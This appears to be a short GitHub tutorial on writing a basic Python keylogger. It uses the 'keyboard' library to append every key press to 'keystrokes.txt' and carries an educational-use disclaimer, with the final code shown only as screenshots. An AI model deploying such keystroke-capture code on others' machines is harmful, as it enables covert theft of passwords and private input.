# Keylogger

# Disclaimer

This tutorial is for educational purposes only and should only be used on your personal system. 
# Prerequisites

Personal host, I recommend doing this in a Windows VM.

Python, code editor, Im using Visual Studio Code.

# Step 1
Install the Required Library.

Open your command prompt or terminal and execute the following command: "pip install keyboard"

# Step 2 Importing the Necessary Libraries
This library will enable us to work with keyboard inputs. Insert the following line of code:

import keyboard

# Step 3 
Define the Log File

In this example, we’ll use ‘keystrokes.txt’ as the file name. Feel free to modify it as desired. Add the following line of code:

log_file = 'keystrokes.txt'

# Step 4
Create the Key Press Event Function

def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))
        
# Step 5 
Register the Key Press Event

Register the ‘on_key_press’ function to be called whenever a key is pressed. This will enable our code to capture the keystrokes. Add the following line:

keyboard.on_press(on_key_press)

# Step 6 
Finally, we want our program to wait until a key is pressed before it exits. Use the 

‘keyboard.wait()’

function to accomplish this.


# Final Code

![Screenshot 2024-07-29 114950](https://github.com/user-attachments/assets/b4c6529f-d7b0-4ef3-b638-9813c1f0cb9b)

# Step 7
Open your command prompt or terminal, navigate to the directory where the script is located, and execute the command:

![Screenshot 2024-07-29 122614](https://github.com/user-attachments/assets/f943a530-664c-4562-bb25-b1f051e2e85f)

 
